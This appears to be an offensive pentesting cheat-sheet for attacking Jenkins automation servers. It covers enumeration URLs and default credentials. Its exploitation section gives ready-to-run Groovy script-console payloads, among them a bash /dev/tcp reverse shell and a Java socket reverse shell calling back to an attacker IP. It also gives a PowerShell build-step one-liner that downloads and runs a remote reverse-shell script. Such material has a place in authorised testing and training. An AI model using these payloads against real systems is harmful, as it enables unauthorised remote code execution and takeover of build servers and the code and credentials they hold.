# Jenkins

{% hint style="info" %}
An open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication. Jenkins is a [continuous integration](https://en.wikipedia.org/wiki/Continuous_integration) server.
{% endhint %}

## Discovery <a href="#jenkins-discovery-enumeration" id="jenkins-discovery-enumeration"></a>

* Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves.
* Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.
* **List of users**: `http://[jenkinsurl]/asynchPeople/`
* **List of all builds:** `http://[jenkinsurl]/view/All/build`s <sup><sub>(Seems to be fixed in the latest version 1.575)<sub></sup>
* **List publicly available content:** `http://[jenkinsurl]/userContent/`
* **Type of the Operating System:** `http://[jenkinsurl]/computer/`
* **Security Settings:** `http://[jenkinsurl]:8000/configureSecurity/`

## Enumeration <a href="#jenkins-discovery-enumeration" id="jenkins-discovery-enumeration"></a>

* Default credentials such as `admin:admin` or does not have any type of authentication enabled.

## Exploitation

### Groovy Script Console <a href="#script-console" id="script-console"></a>

* The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account
* The script console can be reached at the URL `http:///[jenkinsurl]:8000/script`
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">// If you have Admin access (default installation before 2.x), go to:
  // http://&#x3C;jenkins_server>/script
  //Linux
  def cmd = 'id'
  def sout = new StringBuffer(), serr = new StringBuffer()
  def proc = cmd.execute()
  proc.consumeProcessOutput(sout, serr)
  proc.waitForOrKill(1000)
  println sout // println "Out> $sout Err> $serr"
  //Alternate Reverse Shell Command
  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5&#x3C;>/dev/tcp/&#x3C;Attacker-IP>/&#x3C;PORT>;cat &#x3C;&#x26;5 | while read line; do \$line 2>&#x26;5 >&#x26;5; done"] as String[])
  p.waitFor()

  // Windows
  def cmd = "cmd.exe /c dir".execute();
  println("${cmd.text}");
  // Alternate Java Reverse Shell
  String host="&#x3C;Attacker-IP>";
  int port=&#x3C;Port>;
  String cmd="cmd.exe";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
  </code></pre>
* We can also use `exploit/multi/http/jenkins_script_console` Metasploit Module

### Project Build Configuration

* Add a build step, choose **"Execute Windows Batch Command"**
* `powershell -c <command>`
* `powershell -eX (iwr -UseBasicParsing http://<ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress <attacker-IP> -Port <attacker-port>`
* [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
